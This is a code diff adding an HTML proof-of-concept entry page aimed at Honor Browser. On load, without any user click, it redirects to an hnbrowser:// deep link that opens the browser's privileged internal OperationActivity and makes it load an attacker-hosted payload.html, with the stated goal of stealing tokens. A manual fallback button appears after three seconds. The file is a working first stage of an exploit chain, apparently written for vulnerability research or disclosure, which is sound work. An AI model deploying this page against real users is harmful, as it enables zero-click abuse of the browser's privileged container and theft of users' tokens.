@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PoC Entry - Honor Browser Operation Route Token Theft</title>
+<style>
+  body { font-family: monospace; background:#111; color:#0f0; padding:24px; }
+  .btn { display:inline-block; margin-top:20px; padding:14px 24px; background:#0f0; color:#111;
+         font-size:18px; text-decoration:none; border-radius:6px; }
+</style>
+</head>
+<body>
+<h2>[PoC] 荣耀浏览器 /operation 路由 token 窃取 — 入口页</h2>
+<p>本页模拟攻击者恶意网页。加载后<b>无需任何点击</b>，自动通过 hnbrowser:// 路由打开浏览器内部特权容器 OperationActivity 并加载 payload 页。</p>
+<p id="st">正在跳转…</p>
+<a class="btn" id="manual" href="#" style="display:none">若未自动跳转，点此手动触发</a>
+<script>
+// payload 地址自动从当前 origin 推导，零配置：两个文件放同一目录即可
+var payloadUrl = location.origin + '/payload.html';
+var target = 'hnbrowser://com.honor.browser/operation?url=' + encodeURIComponent(payloadUrl);
+document.getElementById('manual').href = target;
+
+// 无用户手势，模拟"浏览即触发"
+setTimeout(function () {
+  try { location.href = target; } catch (e) {
+    document.getElementById('st').textContent = '跳转异常: ' + e;
+  }
+}, 600);
+
+// 3 秒后若仍在本页（跳转被拦截或版本已修复），显示手动按钮作对比
+setTimeout(function () {
+  document.getElementById('st').textContent = '3 秒未跳走：路由可能已修复/被拦截（这本身就是修复证据）';
+  document.getElementById('manual').style.display = 'inline-block';
+}, 3000);
+</script>
+</body>
+</html>
